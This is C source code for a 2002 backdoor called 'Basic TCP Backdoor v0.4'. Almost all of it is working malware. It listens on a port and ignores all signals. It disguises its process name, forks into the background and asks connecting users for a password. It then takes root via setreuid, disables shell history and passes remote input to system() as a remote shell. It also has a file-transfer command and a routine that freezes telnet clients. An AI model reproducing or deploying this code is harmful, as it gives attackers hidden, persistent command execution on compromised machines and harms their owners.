/*
 * Basic TCP Backdoor v0.4
 *
 * 10/10/02 by detach (XT) - www.duho.org
 */

#define ARGC 1
#define BACKLOG 5

#include "main.h"

int pid;

void usage(char *[]);
void kick(int);
int xcmd(int, char *);

int
main(int argc, char *argv[])
{
 int asd;
 int lsd;
 struct sockaddr_in temp; // only for accept()
 int templen; // me too!
 int portnr=0;
 char *paddr;
 int i;
 int c;
 char disguise[255];
 extern int pid;

// opterr=0;
 while ( (c=getopt(argc, argv, "p:d:")) !=EOF )
 {
   switch(c)
   {
     case 'p': portnr = atoi(optarg);
               if (portnr<=0 || portnr>=65536)
               {
                 printf("Stupid! Use a valid port number\n");
                 exit(0);
               }
               break;

     case 'd': strncpy(disguise, optarg, sizeof(optarg));
               for (i=argc-1; i>=0 ; i--)
                 memset(argv[i], 0, strlen(argv[i]));
               strcpy (argv[0], disguise);
            #ifndef STEALTH
               printf("Disguised as \"%s\"\n", disguise);
            #endif
               break;
     default:
            #ifndef STEALTH
               usage(argv);
            #endif
               exit(0);
   }
 }
 if(portnr==0)
 {
   usage(argv);
   exit(0);
 }

#ifndef STEALTH
 printf("Launching server...\n");

 if (geteuid()!=0)
   printf("It'd be more convenient to hack me root privs!\n");

 printf("Ignoring signals...\n");
#endif
 for (i=_NSIG;i>=0;i--)
   signal(i, SIG_IGN);

 lsd = BDlisten(portnr, BACKLOG);
 if (lsd==-1)
   exit(1);

#ifndef STEALTH
   printf("I'm listening (%d)...", portnr);
   fflush(NULL);
#endif

 if ((pid = fork ()))
 {
#ifndef STEALTH
   printf(" leaving you... and pid #%i takes over\n", pid);
   printf("btw; Am I on NASA?\n");
#endif
   exit (0);
 }

 for(;;)
 {
   templen = sizeof(temp);
   asd = accept(lsd, (struct sockaddr*)&temp, &templen);
   if (asd==-1)
   {
     perror("accept");
     continue;
   }

   paddr = inet_ntoa((struct in_addr)temp.sin_addr);

   if (!fork() && asd!=-1)
   {
     char shout[]="\nAt Your Service! ;^}\n\n"; /* Pim Fortuyn liveS! */
     char pass[255];
     close(0);
     close(1);
     close(2);

     memset(pass, 0, sizeof(pass));

     recv(asd, pass, sizeof(pass)-1, 0);
     if (strstr(pass, PASS)==NULL)
     {
       shutdown(asd, SHUT_RDWR);
       exit(0);
     }
     else
       send(asd, shout, strlen(shout), 0);

     setreuid(0,0);
     setenv("PATH", "/sbin:/bin:/usr/sbin:/usr/bin:/usr/local/bin:/usr/local/sbin", 1);
     unsetenv("HISTFILE");

    #ifdef CHECKROOT
     dup2(asd, 0);
     dup2(asd, 1);
     dup2(asd, 2);
     chkroot();
     printf("\nType ;help for backdoor features\n\n");
    #endif

     for (;;)
     {
        if (!xcmd(asd, paddr)) break;
     }

     shutdown(asd, SHUT_RDWR);
     exit(0);
   }
 }
 close(lsd);
}

void usage(char *argv[])
{
  printf("Use: %s -p <port> [-d <disguise_as>]\n", argv[0]);
}

void kick(int asd)
{
 char flame[]="you've got any idea what ya doin'?! "
              "go play with your Xbox kiddo!!\n";
 char poison[]="\377\373\001"; /* Trick by Mixter? Freezes telnet client */
 send(asd, flame, sizeof(flame), 0);
 send(asd, poison, sizeof(poison), 0);
 close(1);
 close(2);
 shutdown(asd, SHUT_RD);
 exit(0);
}

int xcmd(int asd, char *addr)
{
 int idx,
     i;
 int c;
 extern int pid;
 char cmdline[255];
 char cmd[255];
 int outcome;
 char *clueless[]={
      "help",
      "dir",
      "rm -rf /",
      "?",
      "copy ",
      "xcopy ",
      "format ",
      "move ",
      "edit ",
      "cd \\",
      "del ",
      "deltree ",
      NULL};
 char bye[]="> Iz your momma proud of you?\n";
 /*
 struct xfer_struct
 {
   char *file;
   int dir;
   char *ip;
   int port;
 };
 */
 struct xfer_struct xfer;

 close(0);
 close(1);
 close(2);
 dup2(asd, 0);
 dup2(asd, 1);
 dup2(asd, 2);
 memset(cmd, 0, sizeof(cmd));
 memset(cmdline, 0, sizeof(cmdline));

 xfer.ip = addr;

 recv(asd, cmd, sizeof(cmd)-1, 0);

 for(c=idx=0; idx<sizeof(cmd) && cmd[idx]!='\n'&&cmd[idx]!='\r'; idx++)
 {
   if (cmd[idx]!='\n'||cmd[idx]!='\r')
     cmdline[idx]=cmd[idx];
   else
     cmdline[idx]='\0';
 }
 send(asd, "\n", 1, 0);
 if (!strcmp(cmdline, "exit"))
 {
   send(asd, bye, strlen(bye), 0);
   return 0;
 }
 if (!strcmp(cmdline, "logout"))
 {
   send(asd, "use \"exit\"!\n", 13, 0);
   return 1;
 }
 if (!strcmp(cmdline, "unload"))
 {
   send(asd, "Committing suicide :(\n", 22, 0);
   kill(pid, SIGKILL);
 }
 if (!strncmp(cmdline, "cd ", 3))
 {
   send(asd, "sorry, changing dir's won't work (`sh -c' remember?)\n.. use absolute paths instead.\n", 86, 0);
   return 1;
 }
 if (!strncmp(cmdline, ";", 1))
 {
   if (parse_xfer(&cmdline, &xfer)==1)
   {
     if (BDxfer(&xfer)!=1)
       printf("> Failed!\n");
   }
   else
     printf("> Something went wrong while parsing parameters\n");

   return 1;
 }

#ifndef IMALAMER
 for (i=0;;i++)
 {
   if (clueless[i]==NULL)
      break;
   if (!strncmp(cmdline, clueless[i], strlen(clueless[i])))
     (void)kick(asd);
 }
#endif

 outcome = system(cmdline);
 if (outcome==-1)
   send(asd, "> failed!\n\n", 9, 0);
 return 1;
}
